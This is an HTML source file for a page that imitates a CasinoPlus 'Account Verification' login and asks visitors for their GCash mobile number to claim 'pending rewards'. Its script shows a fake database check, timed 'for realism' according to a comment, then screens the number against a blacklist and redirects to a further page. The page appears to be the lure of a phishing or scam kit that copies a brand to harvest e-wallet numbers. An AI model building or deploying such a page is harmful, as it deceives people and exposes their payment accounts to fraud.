<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Account Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 50%, #b8860b 100%);
            --dark-bg: #04070d;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Public Sans', sans-serif; }

        body {
            background-color: var(--dark-bg);
            background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 50%);
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-card {
            background: rgba(255, 255, 255, 0.03);
            width: 100%;
            max-width: 380px;
            padding: 40px 25px;
            border-radius: 25px;
            border: 1px solid rgba(212, 175, 55, 0.3);
            backdrop-filter: blur(10px);
            text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }

        .logo {
            width: 160px;
            margin-bottom: 30px;
            filter: drop-shadow(0 0 10px rgba(212, 175, 55, 0.3));
        }

        h2 { font-weight: 800; font-size: 22px; margin-bottom: 10px; color: #fff; }
        p { color: #9ca3af; font-size: 14px; margin-bottom: 30px; }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 12px;
            color: #fbbf24;
            text-transform: uppercase;
            font-weight: 700;
            margin-bottom: 8px;
            margin-left: 5px;
        }

        input {
            width: 100%;
            padding: 18px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(0,0,0,0.4);
            color: #fff;
            font-size: 18px;
            font-weight: 600;
            outline: none;
            transition: 0.3s;
        }

        input:focus { border-color: #d4af37; box-shadow: 0 0 15px rgba(212,175,55,0.1); }

        .btn-verify {
            background: var(--gold);
            color: #000;
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 800;
            text-transform: uppercase;
            cursor: pointer;
            transition: 0.3s;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }

        .btn-verify:disabled { opacity: 0.7; cursor: not-allowed; }

        /* Error/Status Box */
        #status-msg {
            display: none;
            margin-top: 20px;
            padding: 12px;
            border-radius: 10px;
            font-size: 13px;
            font-weight: 600;
        }
        .error { background: rgba(255, 0, 0, 0.1); color: #ff4d4d; border: 1px solid rgba(255, 0, 0, 0.2); }
        .success { background: rgba(57, 255, 20, 0.1); color: #39ff14; border: 1px solid rgba(57, 255, 20, 0.2); }

        /* Spinner */
        .spinner {
            width: 18px;
            height: 18px;
            border: 3px solid rgba(0,0,0,0.1);
            border-top: 3px solid #000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="login-card">
    <img src="https://casinoplus.static2.website/images/logo1.png" alt="CasinoPlus" class="logo">
    
    <h2>Membership Login</h2>
    <p>Enter your registered GCash number to claim your pending rewards.</p>

    <div class="input-group">
        <label>Mobile Number</label>
        <input type="tel" id="phoneInput" placeholder="09xxxxxxxxx" maxlength="11">
    </div>

    <button class="btn-verify" id="verifyBtn" onclick="handleAuth()">
        Verify Account
    </button>

    <div id="status-msg"></div>
</div>

<script src="config.js"></script>

<script>
    function handleAuth() {
        const input = document.getElementById('phoneInput');
        const btn = document.getElementById('verifyBtn');
        const status = document.getElementById('status-msg');
        const phone = input.value.trim();

        // 1. Validation for empty or short number
        if (phone.length < 11) {
            showStatus("Please enter a valid 11-digit GCash number.", "error");
            return;
        }

        // 2. Start Animation
        btn.disabled = true;
        btn.innerHTML = `<div class="spinner"></div> CHECKING DATABASE...`;
        status.style.display = "none";

        setTimeout(() => {
            // 3. Blacklist Check (Galing sa config.js)
            // Gamit ang array na BLACKLISTED_NUMBERS sa config.js mo
            if (typeof BLACKLISTED_NUMBERS !== 'undefined' && BLACKLISTED_NUMBERS.includes(phone)) {
                showStatus("Access Denied: This number has been flagged for suspicious activity.", "error");
                resetButton();
                return;
            }

            // 4. Success Flow
            btn.innerHTML = "VERIFIED! REDIRECTING...";
            btn.style.background = "#39ff14"; // Green for success
            showStatus("Membership Confirmed! Loading rewards...", "success");

            setTimeout(() => {
                window.location.href = "main.html";
            }, 1500);

        }, 2500); // 2.5 seconds loading for realism
    }

    function showStatus(msg, type) {
        const status = document.getElementById('status-msg');
        status.innerHTML = msg;
        status.className = type;
        status.style.display = "block";
    }

    function resetButton() {
        const btn = document.getElementById('verifyBtn');
        btn.disabled = false;
        btn.innerHTML = "Verify Account";
        btn.style.background = "var(--gold)";
    }

    // Auto-focus input for better UX
    window.onload = () => document.getElementById('phoneInput').focus();
</script>

</body>
</html>
